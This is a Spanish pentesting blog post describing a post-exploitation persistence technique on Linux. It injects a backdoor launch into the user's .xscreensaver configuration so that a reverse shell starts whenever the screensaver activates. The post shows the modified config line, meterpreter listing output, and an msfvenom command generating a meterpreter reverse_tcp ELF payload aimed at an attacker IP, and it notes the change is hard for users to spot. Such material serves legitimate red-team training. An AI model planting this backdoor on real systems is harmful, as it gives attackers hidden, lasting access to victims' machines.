+++
date = "2019-04-22"
title = "Persistencia en sistemas Linux a través de XScreenSaver"
author = "Javier Olmedo"
toc = false
+++

Después de la explotación con éxito de un sistema, debemos de **obtener persistencia** en el mismo, este es uno de los pasos más importantes de las fases del pentesting y que, generalmente, ocasiona más inconvenientes, ya que, **podemos perder el acceso al sistema** si este se reinicia, existen problemas de red o se edita el archivo utilizado como puerta trasera (backdoor).

Esta manera de obtener persistencia, la descubrí leyendo write-ups de CTFs, en concreto, de uno realizado por [iamrastating](https://twitter.com/iamrastating).

Este método, consiste en **modificar el archivo de configuración** de XScreenSaver, un paquete muy común de salvapantallas para Linux, utilizar XScreenSaver para obtener persistencia tiene las siguientes ventajas:

- Es muy poco probable que los usuarios editen el archivo de configuración, lo que significa que hay muy pocas posibilidades de que descubran nuestra shell.

- Existen una probabilidad muy alta de que un usuario haga saltar el salvapantallas, con lo que obtendríamos nuestra shell.

A continuación, se describen los pasos a realizar.

## Identificar si XScreenSaver está instalado en el sistema

Una de las maneras más rápidas de determinar si XScreenSaver está instalado en el sistema, es **buscar el archivo de configuración** (el cual necesitaremos modificar). Este archivo lo podemos encontrar en el directorio del usuario y se llama `.xscreensaver`.

```txt
meterpreter > ls -S xscreensaver
Listing: /home/jolmedo
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  8452  fil   2019-04-17 13:46:17 +0200  .xscreensaver
```

En caso de no encontrar este archivo, no significa que XScreenSaver no esté instalado, sino que el usuario no ha configurado sus preferencias del salvapantallas, en ese caso, se puede crear un archivo nuevo de configuración.

Otros posibles archivos a buscar en la máquina comprometida, serían los siguientes:

- xscreensaver
- xscreensaver-command
- xscreensaver-demo
- xscreensaver-getimage
- xscreensaver-getimage-file
- xscreensaver-getimage-video
- xscreensaver-gl-helper
- xscreensaver-text

Supongamos que durante la explotación, hemos tenido suerte y XScreenSaver se encuentra instalado, si examinamos el archivo de configuración, podemos ver **tres parámetros** importantes:

- `Timeout`: cuánto tiempo debe permanecer inactiva la sesión antes de que se muestre el protector de pantalla.
- `Mode`: si se usa o no un solo protector de pantalla, o si utiliza salvapantallas al azar.
- `Selected`: protector de pantalla seleccionado.

En el siguiente cuadro, se puede observar que el `timeout` está establecido en `0:01:00`, lo que significa que el protector de pantalla se ejecutará después de un minuto de inactividad.

```txt
# XScreenSaver Preferences File
# Written by xscreensaver-demo 5.36 for jolmedo on Wed Apr 17 13:46:17 2019.
# https://www.jwz.org/xscreensaver/

timeout:	0:01:00
cycle:		0:10:00
lock:		False
lockTimeout:	0:00:00
passwdTimeout:	0:00:30
```

Si bajamos un poco más, podemos ver que el parámetro `mode` tiene el valor `one`, eso nos indica que tiene únicamente un protector de pantalla, también podemos observar que la opción `selected` está en la posición `2`, si tenemos en cuenta que la matriz empieza por `0`, `attraction` se ha seleccionado como protector de pantalla.

```txt
mode:		one
selected:	2

textMode:	url
textLiteral:	XScreenSaver
textFile:	
textProgram:	fortune
textURL:	http://feeds.feedburner.com/ubuntu-news

programs:								      \
				maze -root				    \n\
- GL: 				superquadrics -root			    \n\
				attraction -root			    \n\
				blitspin -root				    \n\
```

## Agregar nuestra shell al archivo de configuración

Si nos hemos percatado, `programs` contiene una matriz de cadenas que incluye los nombres de los protectores de pantalla que están disponibles, pero no sólo eso, sino los **comandos básico que se ejecutarán**. En XScreenSaver, cada protector de pantalla es un binario separado que, cuando se ejecuta, se muestra a pantalla completa.

En la configuración que vimos anteriormente, cuando la pantalla se pone en blanco, se ejecuta el comando:

```bash
/usr/lib/xscreensaver/attraction -root
```

Conociendo esto, podríamos inyectar un comando final para lanzar nuestra shell junto al protector de pantalla, como tengo la shell ubicada en `/home/jolmedo/.local/share/shell64.elf`, modifico el archivo xscreensaver para lanzarlo justo después de la linea `attraction -root`, el fichero de configuración ahora se vería así:

```txt
mode:		one
selected:	2

textMode:	url
textLiteral:	XScreenSaver
textFile:	
textProgram:	fortune
textURL:	http://feeds.feedburner.com/ubuntu-news

programs:								      \
				maze -root				    \n\
- GL: 				superquadrics -root			    \n\
              			attraction -root |                            \
               			(/home/jolmedo/.local/share/shell64.elf&)   \n\
				blitspin -root				    \n\
```

Debemos tener en cuenta dos cosas en este cambio:

- La primera es que el `\n\` que estaba al final de `attraction`, ha sido reemplazado por una sola barra invertida `\`, esto indicaría al programa que la cadena continúa en una segunda línea. El `\n` es el delimitador y, por lo tanto, sólo aparece al final del comando completo.

- Lo segundo a tener en cuenta, es el uso de `|` y `&`, la shell se llama de esta manera para garantizar que se inicie junto con el binario de `attraction` y que no detenga la ejecución al forzarla en segundo plano.

A continuación, se muestra una prueba de concepto, en la parte derecha, se encuentra un equipo que hace saltar el protector de pantalla, y en la parte izquierda, puede observarse como el equipo atacante recibe una shell reversa.

[![/images/persistencia-en-sistemas-linux-a-traves-de-xscreensaver/persistencia-en-sistemas-linux-a-traves-de-xscreensaver_001.gif](/images/persistencia-en-sistemas-linux-a-traves-de-xscreensaver/persistencia-en-sistemas-linux-a-traves-de-xscreensaver_001.gif)](/images/persistencia-en-sistemas-linux-a-traves-de-xscreensaver/persistencia-en-sistemas-linux-a-traves-de-xscreensaver_001.gif)

Prueba de concepto de obtención de shell mediante la modificación de XScreenSaver

## NOTA

La shell creada en el post ha sido generado por **msfvenom**.

```bash
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=[IP-ATACANTE] LPORT=4444 -f elf > shell64.elf
```

Hasta la próxima!!